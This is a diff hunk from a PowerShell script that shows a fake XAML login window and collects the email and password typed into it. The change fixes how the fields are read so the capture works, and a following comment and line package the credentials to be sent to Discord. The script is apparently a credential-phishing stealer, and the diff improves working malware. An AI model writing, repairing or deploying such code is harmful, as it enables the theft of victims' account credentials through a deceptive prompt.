@@ -136,8 +136,8 @@ $loginWindow = [Windows.Markup.XamlReader]::Load($reader)
 # Define an event handler for the Login button
 $loginButton = $loginWindow.FindName("LoginButton")
 $loginButton.Add_Click({
-    $enteredUsername = $Username.Text
-    $enteredPassword = $Password.Password
+    $enteredUsername = $loginWindow.FindName("Username").Text
+    $enteredPassword = $loginWindow.FindName("Password").Password
 
     # Send the collected data to Discord
     $creds = "Email: $enteredUsername`nPassword: $enteredPassword"
